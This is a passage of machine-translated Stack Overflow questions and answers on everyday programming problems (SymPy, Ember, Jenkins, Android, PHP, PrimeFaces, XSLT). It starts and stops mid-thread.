由于我想求解的方程不是那种形式，实际上将它们求解为 0 是我使用像 sympy 这样的库的目的，有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-19T05:29:57.677

文档的意思是，如果你做类似的事情

```
>>> solve(x**2 - 1, x) 
```

然后`solve`隐含地假设`x**2 - 1`等于`0`。如果你想解决`x**2 - 1 = 2`，那么你可以`2`从两边减去，得到

```
>>> solve(x**2 - 1 - 2, x) 
```

或者你可以使用这个`Eq()`类

```
>>> solve(Eq(x**2 - 1, 2), x) 
```

# routes - Ember Router 动态路由

> ID：12954557
> 
> 赞同：0
> 
> 时间：2012-10-18T12:22:47.983
> 
> 标签：routes, ember.js

我有某种“破折号视图”，其中显示了部分项目。该项目可能会“切换”（通过一些导航）以显示在主插座中。到目前为止，我没有使用 Ember 的 Router / StateManager 东西，而是手动序列化/反序列化 URL，并使用 window.history 来启用后退/转发和“通过 URL 恢复”功能。例如

```
#/dash/foo,bar 
#/dash/foo,bar,ted 
```

应该分别显示 foo、bar 和 ted 元素。这些项目可能会在后台延迟加载。因此，如果您通过添加书签/直接编辑 URL 来恢复应用程序状态，这些项目实际上可能会在一段时间后到达。

我尝试为这些东西使用 Ember.Router，但我就是不让它工作......

我通读了这个很棒的指南[http://emberjs.com/guides/router_primer/](http://emberjs.com/guides/router_primer/)。但是描述的场景总是这样的：你有一个集合视图和一个单项视图。但这不适用于我的应用程序。

在这种情况下，我有 3 个项目，我想通过切换它们来选择其中一些显示在插座中。（通常这可以是选择、取消选择、切换或按表达式搜索）。selected-items-in-dash-state 应该被序列化为 URL，并且可以通过添加书签或直接修改 URL 来恢复。

切换是这样实现的：

```
<a {{action toggle name href=true}}>{{name}}</a> 
```

这就是现在的数据获取和选择逻辑的方式（它不工作）

```
App.dash = Ember.Object.create({
    FIXTURE: [App.Item.create({
        name: 'foo',
        detail: 'Some very interesting foo'
    }),App.Item.create({
        name: 'bar',
        detail: 'Bar is the root of all stuff'
    }),App.Item.create({
        name: 'ted',
        detail: 'Ted is not my name'
    })],
    store: Ember.A(),
    selected: Ember.A(),
    _items: Ember.A(),
    watchItems: function () {
        var items = this._items;
        var store = this.store;
        items.clear();
        this.get('selected').forEach(function (name) {
            var item = store.findProperty('name', name);
            items.pushObject(item);
        });
    }.observes('selected', 'store'),
    toggle: function (name) {
        var selected = this.get('selected');
        var index = selected.indexOf(name);
        if (index !== -1) {
            selected.removeAt(index);
        } else {
            selected.push(name);
        }
        this.set('selected', selected);
    },
    fetch: function () {
        var FIXTURE = this.FIXTURE;
        var store = this.store;
        if (store.length == 0) {
            Ember.run.later(function () {
                FIXTURE.forEach(function (item) {
                    store.pushObject(item);
                });
            }, 2000);
        }
    },        
    items: function (selected) {
        var items = this._items;
        items.clear();
        if (Ember.isArray(selected)) {
            this.set('selected', selected);
        } else {
            this.set('selected', []);
        }
        this.fetch();
        return items;
    }
}); 
```

那就是路由器：

```
 App.Router = Ember.Router.extend({
    root: Ember.Route.extend({
        index: Ember.Route.extend({
            route: '/',
            redirectsTo: 'dash'
        }),
        dash: Ember.Route.extend({
            route: '/dash/:selected',
            connectOutlets: function (router, context) {
                var selected = context && context.selected;
                var dashItems = App.dash.items(selected);
                router.get('applicationController').connectOutlet('dash', dashItems);
            },
            deserialize: function (router, params) {
                if (params.selected !== 'undefined') {
                    return params.selected;
                }
            },
            serialize: function (router, context) {
                var selected = App.dash.get('selected');
                var hash = {
                    selected: selected
                };
                return hash;
            },
            toggle: function (router, event) {
                event.preventDefault();
                event.stopPropagation();
                var name = event.context;
                App.dash.toggle(name);
                var selected = App.dash.get('selected');
                router.transitionTo('dash', {
                    selected: selected
                });
            },
            eventTransitions: {
                toggle: 'dash'
            }
        })
    })
}); 
```

这是完整的小提琴[http://jsfiddle.net/NWfbj/1](http://jsfiddle.net/NWfbj/1)

非常感谢任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-19T08:44:41.487

好吧，我尝试解决一些问题：

*   在访问 Ember 对象中的属性时，一个好的规则是始终使用 get('property')/set('property',value')

*   当您想观察数组内容时，请使用特殊的“@each”。然后当添加/删除数组中的任何对象时触发观察者。

*   我在 items() 函数中删除了我认为的额外 items.clear() 。

如果您希望能够通过 URL 进行操作，我认为您必须查看反序列化方法，以便返回您期望的内容（我不知道它是否应该是字符串数组，一个项目数组（从商店），这取决于你:)

你可以看到我在这里做了什么：http: [//jsfiddle.net/Sly7/NWfbj/23/](http://jsfiddle.net/Sly7/NWfbj/23/)

```
<script type="text/x-handlebars" data-template-name='application'>
  <h1>Dash Router App</h1>
  {{#each App.dash.store}}
  <a {{action toggle name href=true}}>{{name}}</a>
  {{/each}}
  {{outlet}}
</script>

<script type="text/x-handlebars" data-template-name='dash'>
   {{#each controller}}
    <h1>{{detail}}</h1>
   {{/each}}
</script> 
```

```
App = Ember.Application.create();
App.Item = Ember.Object.extend({
    name: null,
    detail: null
});

App.dash = Ember.Object.create({
    FIXTURE: [{
        name: 'foo',
        detail: 'Some very interesting foo'
    }, {
        name: 'bar',
        detail: 'Bar is the root of all stuff'
    }, {
        name: 'ted',
        detail: 'Ted is not my name'
    }],
    store: [],

    selected: [],

    _items: [],

    watchItems: function () {
        console.log('watch items', this.get('selected'));
        var self = this;
        this.get('_items').clear();
        this.get('selected').forEach(function (name) {
            var item = self.get('store').findProperty('name', name);
            console.log(name);
            self.get('_items').pushObject(item);
        });
    }.observes('selected.@each', 'store.@each'),

    toggle: function (name) {
        var selected = this.get('selected');
        var index = selected.indexOf(name);
        if (index !== -1) {
            selected.removeObject(name);
        } else {
            selected.pushObject(name);
        }
        console.log('toggle', name, 'is now selected?', selected.indexOf(name) !== -1, selected);
        this.set('selected', selected);
    },

    fetch: function () {
        var FIXTURE = this.get('FIXTURE');
        var store = this.get('store');
        if (store.length == 0) {
            Ember.run.later(function () {
                FIXTURE.forEach(function (item) {
                    store.pushObject(item);
                });
            }, 2000);
        }
    },  

    items: function (selected) {
        if (Ember.isArray(selected)) {
            this.set('selected', selected);
        } else {
            this.set('selected', []);
        }
        this.fetch();
        return this.get('_items');
    }
});
App.ApplicationController = Ember.Controller.extend({});
App.ApplicationView = Ember.View.extend({
    templateName: 'application'
});
App.DashView = Ember.View.extend({
    templateName: 'dash'
});
App.DashController = Ember.ArrayController.extend({});

App.Router = Ember.Router.extend({
    enableLogging: true,
    root: Ember.Route.extend({
        index: Ember.Route.extend({
            route: '/',
            redirectsTo: 'dash'
        }),
        dash: Ember.Route.extend({
            enter: function () {
                console.log('entering dash');
            },
            exit: function () {
                console.log('exiting dash');
            },
            route: '/dash/:selected',
            connectOutlets: function (router, context) {
                debugger;
                var selected = context && context.selected;
                console.log('connectOutlets', 'selected:', selected);
                var dashItems = App.dash.items(selected);
                console.log('connectOutlets', dashItems);
                router.get('applicationController').connectOutlet('dash', dashItems);
            },
            deserialize: function (router, params) {
                debugger;
                console.log('deserialize', 'selected:', params.selected);
                if (params.selected !== 'undefined') {
                    return params.selected;
                }
            },
            serialize: function (router, context) {
                var selected = App.dash.get('selected');
                var hash = {
                    selected: selected
                };
                console.log('serialize', 'selected:', selected);
                return hash;
            },
            toggle: function (router, event) {
                debugger;
                event.preventDefault();
                event.stopPropagation();
                var name = event.context;
                console.log('clicked',name);
                App.dash.toggle(name);
                var selected = App.dash.get('selected');
                console.log('transitionTo', 'selected:', selected);
                router.transitionTo('dash', {
                    selected: selected
                });
            },
            eventTransitions: {
                toggle: 'dash'
            }
        })
    })
});
App.initialize(); 
```

# java - 嵌入式作业执行而不是触发执行

> ID：12954566
> 
> 赞同：0
> 
> 时间：2012-10-18T12:23:12.057
> 
> 标签：java, jenkins, jenkins-plugins

我们有一个参数化的工作来执行数据库集成测试。该参数基本上是要测试的数据库的品牌（即mysql，derby，oracle等......）。我们希望确保*完全相同*的测试在所有支持的数据库上成功。

我们的问题是 Jenkins 没有考虑执行的参数。执行结果不按参数值分组。因此，如果最后一次执行成功，则该作业被认为是成功的。即使以前的工作可能失败了。

无论如何，我正在寻找一种方法来保持单一的工作定义。如果定义是重复的，那么它们迟早会出现分歧的危险。并且测试将成为特定于数据库品牌的。

到目前为止我已经尝试过：

*   为每个参数值制作一个虚拟作业并从那里触发参数化作业。但是触发作业的结果不包含在虚拟作业中。
*   模板插件是正确的，因为它认为参数化作业是“不可构建的”。

简单的解决方案当然是复制作业。但我真的想避免这种情况。

有人对此有实际的解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-20T13:47:23.110

我建议看看[Multijob Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Multijob+Plugin "多任务插件")。有了它，您可以设置控制作业并为相关作业设置参数。您还可以定义该作业是否应继续执行失败的相关作业。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T11:45:35.963

找到了 ！它实际上是詹金斯的一部分。这是一个“多配置项目”。这种工作定义了一个或多个维度（轴），每个维度（轴）都有其不同的值。为每个不同的值运行一个单独的作业。

使用轴的名称创建一个环境变量。该变量的值对于每个构建都是不同的。

在 Jenkins 中，构建按轴的值进行分组。

瞧！用于不同执行的单个作业配置。

而且似乎可以定义不止一个轴。所以我认为所有轴的每个不同组合都会有一个构建！

# android - ActionBar 仅更改所选选项卡的颜色/可绘制对象？

> ID：12954567
> 
> 赞同：1
> 
> 时间：2012-10-18T12:23:15.470
> 
> 标签：android, android-actionbar, actionbarsherlock

要更改**所有** `ACtionBar`选项卡的颜色或背景，我可以使用`actionBar.setStackedBackgroundDrawable()`.

但是如何更改所选选项卡的颜色或可绘制对象？例如，标签的背景颜色是黑色，但是当我选择某个标签时，我希望它是红色的。

可以这样做，因为我无法找到有关此问题的主题。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-21T16:03:55.847

替换用于选项卡的选择器：

```
<style name="Custom" parent="@style/Theme.Sherlock">
    <item name="actionBarTabStyle">@style/Widget.Custom.TabView</item>

    <item name="android:actionBarTabStyle">@style/Widget.Custom.TabView</item>
</style>

<style name="Widget.Custom.TabView" parent="@style/Widget.Sherlock.ActionBar.TabView">
    <item name="android:background">@drawable/your_custom_selector</item>
</style> 
```

查看标题为 ABS 中的 Drawable 以`abs__tab_indicator_ab_holo.xml`供参考，了解如何创建`your_custom_selector`.

你想改变任何有`android:state_selected="true"`.

# git - 将具有许多模块的 CVS 项目转换为一个 git 存储库的最佳方法是什么？

> ID：12954572
> 
> 赞同：3
> 
> 时间：2012-10-18T12:23:27.863
> 
> 标签：git, version-control, cvs

我继承了一个由许多模块组成的旧 CVS 项目。这种分成模块主要是历史性的，逻辑上它们属于一起。我想将其切换到 GIT 项目。git cvsimport 似乎仅限于转换一个模块，但我不想将 GIT 子模块用于 CVS 模块 - 开销太大。

我已经简要地研究了 cvs2git - 它似乎工作，但它为标签创建了许多虚假提交（好的，一些 CVS 标签不覆盖整个 CVS 源代码树）。

我听说过的另一个工具是裁缝——但我根本无法让它工作。

还有其他建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-01-15T14:37:20.703

看起来你最好的机会是在你的根模块中声明一个根模块`CVSROOT/modules`并引用它下面的所有其他模块：

```
#M  everything  Composite module which holds all other submodules
everything  &foo \
        &bar \
        &baz 
```

– 然后`git-cvsimport`像往常一样调用：

```
git cvsimport -k -A authors everything -C my-git-repo 
```

不过，这种方法并不总是对我有用（我收到了已知的错误消息`WARNING: file foo doesn't match strip_path bar ignoring`）。以下是 Jeff King 的[建议](http://git.661346.n2.nabble.com/cvsimport-error-when-modulename-is-td4565923.html)：

> 作为一个黑客，如果你可以移动 CVS 存储库中的文件（如果你不能，尝试使用 cvssuck 或类似方法将它们拉到本地，然后从那里导入），然后将所有内容移动到子模块“foo”，并导入该模块。
> 
> 或者，您可以查看一些替代导入器，例如 parsecvs 或 cvs2git。我不知道他们是否会更好地处理这种情况。
> 
> 作为一个超级 hacky 的替代方案，您可以单独导入每个模块，然后使用 git-filter-branch 将它们拼接在一起。

由于`git-cvsimport`似乎是唯一支持作者映射的实用程序，我建议您在存储库中移动文件，然后使用`git-cvsimport`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-13T09:05:36.517

更新：我继续直接调用 cvs2git。我选择了要保留的 CVS 模块，并让野兽运行了大约 1 天。

之后，我使用 git filter-branch 将来自 CVS 的提交者信息与来自 GIT 的信息合并 - 这实际上并没有完全贯穿，我忽略了一些名称，但由于这更像是一个美学问题，我让它留下来。

为了将旧 CVS 存储库和新 GIT 存储库之间的历史拼接在一起，我使用移植将历史拼接在一起，然后（在创建移植文件后）我再次运行 git filter-branch 以将历史融合在一起。

这种融合并没有完全成功（还有一些重叠），但它足以遵循历史。

# javascript - TypeError: $(".ajax-fc-container").captcha 不是函数

> ID：12954575
> 
> 赞同：1
> 
> 时间：2012-10-18T12:23:38.487
> 
> 标签：javascript, jquery, function, captcha, typeerror

我遇到了验证码问题（[http://www.webdesignbeach.com/beachbar/ajax-fancy-captcha-jquery-plugin](http://www.webdesignbeach.com/beachbar/ajax-fancy-captcha-jquery-plugin)）。我收到了标题中的错误。有大佬知道是什么问题吗？

“obj”有“captxt”和“array”字段。我包括`jquery-1.5.1.min.js`和`jquery-ui.min.js`库这是我的 JS 代码中的一个示例：

```
function loadlang(lang) {
    var rand = $.ajax({ url: '/captcha/data.aspx', async: false }).responseText;
    var obj = eval(rand)[0];

    $(".red").removeClass('red');

    $(function () {
        $(".ajax-fc-container").captcha({
            borderColor: "silver",
            text: obj['captxt'],
            items: obj['array']
        });
    });
    $("#resend_password_link").html(obj['resend_password_link']);
    $("#sectxt").html(obj['sectxt']);
    $("#more").html(obj['more']);
    $("#langtxt").html(obj['langtxt']);
    $("#optionstxt").html(obj['optionstxt']);

    $("#submit").val(obj['Login']);
    $("#tab").hide();

    $("#desc").html(obj['Text']);
    $("#dialog").html(obj['Browser']);
}

$(document).ready(function () {

    $.browser.chrome = /chrome/.test(navigator.userAgent.toLowerCase());

    //InitLang();
    var lang = document.location.href.split('lang=')[1] || 'pl';
    loadlang(lang);

    $("#lang").remove();
    $("#myForm").append("<input id=\"lang\" type=\"hidden\" style=\"display: none;\" name=\"lang\" value=\"" + lang + "\">");

    $('.lang').click(function () {
        $("#lang").remove();
        $("#myForm").append("<input id=\"lang\" type=\"hidden\" style=\"display: none;\" name=\"lang\" value=\"" + $(this)[0].id + "\">");

        loadlang($(this)[0].id);
    }); 
```

# php - 如何相对要求 PHP 文件（在不同的目录级别）？

> ID：12954578
> 
> 赞同：51
> 
> 时间：2012-10-18T12:24:03.033
> 
> 标签：php, relative-path

我有以下文件结构：

```
根目录
    目录1
        子目录1
           文件0.php
           文件1.php
    目录2
       文件2.php
       文件3.php
       文件4.php   

```

`file1.php`需要`file3.php`和`file4.php`来自 dir2 像这样：

```
require('../../dir2/file3.php') 
```

`file2.php`要求`file1.php`是这样的：

```
require('../dir1/subdir1/file1.php') 
```

但是随后 require in`file1.php`无法打开`file3.php`并且`file4.php`（可能是由于路径相关性）

但是，这是什么原因，我该怎么做才能`file2.php`正确`file1.php`地要求`file3.php`和`file4.php`？

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2013-08-11T13:19:29.940

对于相对路径，您可以`__DIR__`直接使用而不是`dirname(__FILE__)`（只要您[使用的是 PHP 5.3.0 及更高版本](http://php.net/manual/en/language.constants.predefined.php)）：

```
require(__DIR__.'/../../dir2/file3.php'); 
```

请记住在引号内的路径开头添加额外的正斜杠。

看：

*   [PHP - 使用 require_once/include/require，路径与什么相关？](https://stackoverflow.com/questions/1954750/php-with-require-once-include-require-the-path-is-relative-to-what#1954761)
*   [PHP - 相对路径“需要”](https://stackoverflow.com/questions/13898894/php-relative-paths-require#13898946)

* * *

## 回答 #2

> 赞同：55
> 
> 时间：2012-10-18T12:38:28.570

尝试`dirname(__FILE__)`在路径之前添加，例如：

```
require(dirname(__FILE__).'/../../dir2/file3.php'); 
```

它应该包括从根目录开始的文件

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-03-03T02:52:03.937

一个可行的建议是避免在您的 php Web 应用程序中使用“../../”相对路径。它很难阅读并且维护起来很糟糕。

1.  正如你可以证明的那样。这使您很难知道您所指向的内容。

2.  如果您需要更改应用程序的文件夹级别或其中的一部分。它完全容易出错，并且可能会破坏一些难以调试的东西。

相反，首选模式是`define`引导文件中的一些常量作为主路径，然后使用：

```
require(MY_DIR.'/dir1/dir2/file3.php'); 
```

`MY_DIR`从那里移动您的应用程序就像在一个文件中替换您的常量一样简单。

如果你必须保持相对。至少，[根据相对路径引用构造一个绝对路径](https://gist.github.com/DaveRandom/6830e379578a66e2c82593137e79d099)，就像接受的响应所建议的那样。但是，请牢记命名`../`匿名中间路径的重要性，以消除混淆或歧义。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-05-07T14:14:56.043

您也可以始终将`$_SERVER['DOCUMENT_ROOT']`用作有效的起点，而不是诉诸相对路径。只是另一种选择。

```
require($_SERVER['DOCUMENT_ROOT'].'/wp-load.php'); 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-10-18T12:49:14.750

我认为你的 cwd 是 dir2。尝试 ：

```
require("file3.php");
require("file4.php"); 
```

# datatable - 按下命令按钮时填充 Primefaces 数据表

> ID：12954579
> 
> 赞同：1
> 
> 时间：2012-10-18T12:24:03.397
> 
> 标签：datatable, primefaces, populate

我想在primefaces中按下commandButton时将数据加载到数据表中。第一次加载页面时，数据表必须为空，但点击命令按钮后，数据表必须加载！我能怎么做。我是primefaces的新手。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-19T12:33:43.270

根据您在问题中的描述，这是一个示例（这只是@Manuel 描述的工作示例）。由于 backing bean 上的 List 为空，因此在初始渲染时，数据表将为空。当您单击命令按钮时，它将触发 doPopulateList() 方法。然后，此方法将填充列表。最后，更新属性将导致数据表从支持 bean 重新加载列表。这次列表将填充 4 条记录。

```
<h:body>
    <h:form>
        <p:dataTable id="fooTable" value="#{dataTableBean.dataTableList}" var="record">
            <p:column><h:outputText value="#{record}"/></p:column>
        </p:dataTable>

        <p:commandButton value="Populate DataTable" actionListener="#{dataTableBean.doPopulateList()}" update="fooTable"/>
    </h:form>
</h:body> 
```

DataTableSample 支持 bean：

```
@ManagedBean
@ViewScoped
public class DataTableBean implements Serializable {
    List<String> dataTableList = new ArrayList<String>();

    /**
     * @return the dataTableList
     */
    public List<String> getDataTableList() {
        return dataTableList;
    }

    /**
     * @param dataTableList the dataTableList to set
     */
    public void setDataTableList(List<String> dataTableList) {
        this.dataTableList = dataTableList;
    }

    public void doPopulateList(){
        dataTableList.add("Record1");
        dataTableList.add("Record2");
        dataTableList.add("Record3");
        dataTableList.add("Record4");
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:51:58.160

不要在页面首次加载时初始化您的 dataTable 值。之后，您可以更新*p:dataTable*

通过更新它的*id*。只需添加

```
<p:dataTable id="dataTableId" ...>

<p:commandButton update="dataTableId" ..> 
```

到你的命令按钮。此外，您需要使用

```
action="#{bean.addStuffToDataTable}" 
```

或者

```
actionListener="#{bean.addStuffToDataTable}" 
```

作为*p:commandButton*中的属性，以便在 dataTable 中填充数据。在使用这些属性之一之前，请务必阅读[action 和 actionListener 之间的差异。](https://stackoverflow.com/questions/3909267/differences-between-action-and-actionlistener)

# android - ProgressDialog.show() 的上下文参数是什么？

> ID：12954590
> 
> 赞同：2
> 
> 时间：2012-10-18T12:24:35.610
> 
> 标签：android, dialog, progress

我是安卓新手。我正在尝试构建一个简单的 android 应用程序：用户单击按钮并出现一个进度对话框 5 秒钟。我使用 ProgressDialog.show() 并遇到了上下文参数的问题。这是我的xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >
    <Button
        android:id="@+id/btnDialog2"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="@string/btnDialog2" />
</LinearLayout> 
```

这是我的代码：

```
public class Dialog22Activity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        Button btnDialog2 = (Button)findViewById(R.id.btnDialog2);
        btnDialog2.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                final ProgressDialog dialog = ProgressDialog.show(getBaseContext(), 
                        "Progress dialog", "Loading...", true);
                new Thread(new Runnable() {

                    @Override
                    public void run() {
                        try {
                            Thread.sleep(5000);
                            dialog.dismiss();
                        } catch (InterruptedException e) {

                        }

                    }
                }).start();
            }           
        });
    }
} 
```

如果我将 ProgressDialog.show() 的上下文参数从 getBaseContext() 更改为 v.getContext() 我的程序将正常运行。所以我想问这里的上下文参数是什么意思？感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:32:10.477

只需使用`Dialog22Activity.this`而不是 getContext() 或 WhatEverContextFunction() 你想要的，当你在这个类中时，你会很酷:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:29:43.083

您可以参考 android 文档以获取这些解释，请参阅此

[http://developer.android.com/reference/android/content/Context.html](http://developer.android.com/reference/android/content/Context.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:29:48.533

getContext() 未在 Activity 中定义。它在视图（或视图子类）中用于获取对封闭上下文（活动）的引用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-23T18:36:24.637

如果您正在显示当前活动的进度对话框，请使用 classname.class 或 'this' 关键字作为上下文。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-11-23T19:42:39.913

ProgressDialog.show(context) 中的上下文是指此 ProgressDialog 的父上下文。

BaseContext 有效地返回由 ContextWrapper 包装的任何上下文。通过查看代码，我可以说这可能是一个 Activity 或 Application 但是 ContextWrapper 有超过 40 个已知的直接和间接子级。

问题是这意味着方法返回的内容可能不明确，我宁愿直接使用 getContext() 或 Activity、FragmentActivity、ActionBarActivity 等，这样我就知道我在坚持什么，我在坚持什么对可能导致内存泄漏的事物的引用。此外，我还有一个额外的好处是能够利用这些类提供的方法。

如果你想在一个活动的外部类中使用 ProgressDialog，你可以在这个类中创建一个 Context 的实例，ProgressDialog 将使用它的上下文：

```
public class DownloadTask extends AsyncTask<URL, Integer, Void>{

ProgressDialog progressDialog;
private Context context;

@Override
protected void onPreExecute() {
    super.onPreExecute();

    progressDialog = new ProgressDialog(context);

} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-05-01T05:27:44.193

```
 import androidx.appcompat.app.AppCompatActivity;
        import android.app.ProgressDialog;
        import android.os.Bundle;
        import android.webkit.WebView;
        import android.view.View;
        import android.webkit.WebViewClient;
        import android.webkit.WebChromeClient;
        import android.webkit.WebSettings;
        import android.webkit.JsResult;
        import android.widget.Toast;

        public class MainActivity extends AppCompatActivity {

        private WebView webView;
        private ProgressDialog progressDialog;

        startWebView("http://.../mobile/");

        }

        private void startWebView(String url) {

        WebSettings settings = webView.getSettings();

        settings.setJavaScriptEnabled(true);
        webView.setScrollBarStyle(View.SCROLLBARS_OUTSIDE_OVERLAY);

        webView.getSettings().setBuiltInZoomControls(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setLoadWithOverviewMode(true);

        progressDialog = new ProgressDialog(this);
        progressDialog.setTitle("Loading...");
        progressDialog.setMessage("Wait while loading...");
        progressDialog.setCancelable(false); // disable dismiss by tapping outside of the dialog
        progressDialog.show();

        webView.setWebViewClient(new WebViewClient() {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
        view.loadUrl(url);
        return true;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
        if (progressDialog.isShowing()) {
        progressDialog.dismiss();
        }
        }

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
        Toast.makeText(getApplicationContext(), "Error:" + description, Toast.LENGTH_SHORT).show();

        }
        });

        webView.loadUrl(url);
        }
        } 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-10-18T12:29:11.213

它的活动上下文。利用：

```
public class Dialog22Activity extends Activity {
    private Activity activity;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        activity = this;

        Button btnDialog2 = (Button)findViewById(R.id.btnDialog2);
        btnDialog2.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                final ProgressDialog dialog = ProgressDialog.show(activity, 
                        "Progress dialog", "Loading...", true);
                new Thread(new Runnable() {

                    @Override
                    public void run() {
                        try {
                            Thread.sleep(5000);
                            dialog.dismiss();
                        } catch (InterruptedException e) {

                        }

                    }
                }).start();
            }           
        });
    }
} 
```

有关上下文的信息：[Android 上的“上下文”是什么？](https://stackoverflow.com/questions/3572463/what-is-context-in-android)

# c# - 为什么从模板 ASP.Net MVC4 中提取 edmx 后类型不兼容

> ID：12954600
> 
> 赞同：1
> 
> 时间：2012-10-18T12:24:58.673
> 
> 标签：c#, entity-framework, asp.net-mvc-4, visual-studio-2012

我是 .net 的新手，更像是一个 Java 人，但我认为我已经掌握了窍门。直到现在，在以数据库优先方式提取实体数据模型之后，我才突然收到一些不兼容的类型错误（见下文）。我什么也没做。

重现：

1.  我使用帐户控制器创建了一个模板 C# ASP.Net MVC4 互联网应用程序。
2.  运行它并创建了一个测试帐户。
3.  停止调试。
4.  然后使用默认连接字符串通过 Project > Add new item > data > ADO.Net Entity Data Model 提取 .edmx。
5.  然后再次尝试调试，得到如下错误：

    ```
    Error   1   Cannot implicitly convert type 'MvcApplication1.Models.UserProfile' to 'MvcApplication1.UserProfile'    <fileLocation>  268 40  MvcApplication1
    Error   2   The best overloaded method match for 'System.Data.Entity.DbSet<MvcApplication1.Models.UserProfile>.Add(MvcApplication1.Models.UserProfile)' has some invalid arguments  <fileLocation>  273 25  MvcApplication1
    Error   3   Argument 1: cannot convert from 'MvcApplication1.UserProfile' to 'MvcApplication1.Models.UserProfile'   <fileLocation>  273 45  MvcApplication1 
    ```

我可以提供代码，但它是默认的 MS 模板代码。

我想以这种方式进行提取，因此我可以扩展默认的 MS 模型，以模型优先的方式进一步开发。

*   怎么了？
*   我该如何解决？
*   还是我完全错了？（在这种情况下，如果可能的话，我仍然想修复它。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T15:27:55.190

原因是 MVC4 附带了一个基于 Code First 的成员模型，您可以在 AccountModels.cs 文件中找到它。您正在尝试使用 .edmx 文件创建第二个模型，因此编译器抱怨您有两个不兼容的同名类型。

对此的解决方案是，您要么不在 .edmx 文件中添加 UserProfile，要么摆脱代码优先模型并仅使用 .edmx 模型。

# xslt - 如何使用 xslt 提取数字的整数部分

> ID：12954601
> 
> 赞同：2
> 
> 时间：2012-10-18T12:24:59.077
> 
> 标签：xslt, xslt-1.0

我有这个 xml 文件：

```
 <pas>
  <rulepar>
    <name1>Hi</name1>
    <name2></name2>
    <type>DOUBLE</type>
    <oper>HIGH</oper>
    <val1>103619.9</val1>
    <bId>2</bId>
  </rulepar>
  <rulepar>
    <name1>Hi</name1>
    <name2></name2>
    <type>Text</type>
    <oper>LOW</oper>
    <sumval1>-103.67</sumval1>
    <bId>3</bId>
  </rulepar>
 </pas><rulepar>
    <name1>Hi</name1>
    <name2></name2>
    <type>Text</type>
    <oper>LOW</oper>
    <val1>10</val1>
    <bId>3</bId>
  </rulepar>
 </pas> 
```

使用这个 xsl 文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"
xmlns:ex="http://exslt.org/dates-and-times" extension-element-prefixes="ex">
<xsl:output method="xml" version="1.0" encoding="UTF-8" indent="no" xml:space="preserve"/>

<xsl:template match="node()|@*">
    <xsl:copy>
        <xsl:apply-templates select="node()|@*"/>
    </xsl:copy>
</xsl:template>

<xsl:template match="val1|sumval1">  
    <val111><xsl:value-of select="."/></val111>
</xsl:template> 
```

当我进行转换时，结果如下：

```
 <pas>
  <rulepar>
    <name1>Hi</name1>
    <name2></name2>
    <type>DOUBLE</type>
    <oper>HIGH</oper>
    <val111>103619.9</val111>
    <bId>2</bId>
  </rulepar>
  <rulepar>
    <name1>Hi</name1>
    <name2></name2>
    <type>Text</type>
    <oper>LOW</oper>
    <val111>-103.67</val111>
    <bId>3</bId>
  </rulepar>
 </pas><rulepar>
    <name1>Hi</name1>
    <name2></name2>
    <type>Text</type>
    <oper>LOW</oper>
    <val111>10</val111>
    <bId>3</bId>
  </rulepar>
 </pas> 
```

我通常期望这个输出：

```
 <pas>
  <rulepar>
    <name1>Hi</name1>
    <name2></name2>
    <type>DOUBLE</type>
    <oper>HIGH</oper>
    <val111>103619</val111>
    <bId>2</bId>
  </rulepar>
  <rulepar>
    <name1>Hi</name1>
    <name2></name2>
    <type>Text</type>
    <oper>LOW</oper>
    <val111>-103</val111>
    <bId>3</bId>
  </rulepar>
 </pas><rulepar>
    <name1>Hi</name1>
    <name2></name2>
    <type>Text</type>
    <oper>LOW</oper>
    <val111>10</val111>
    <bId>3</bId>
  </rulepar>
 </pas> 
```

那么，如何才能在结果中仅获取数字 103619.9 的整数部分，如预期的输出文件中所示？我想要一个解决方案，当数字只是一个十进制数字并且这个数字<0时也可以走。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T13:35:52.360

**这个 XPath 1.0 表达式为您提供数字的整数部分——无论数字是正数还是负数**：

```
floor(.)*(. >= 0)    +   ceiling(.) * not(. >= 0) 
```

**说明**：

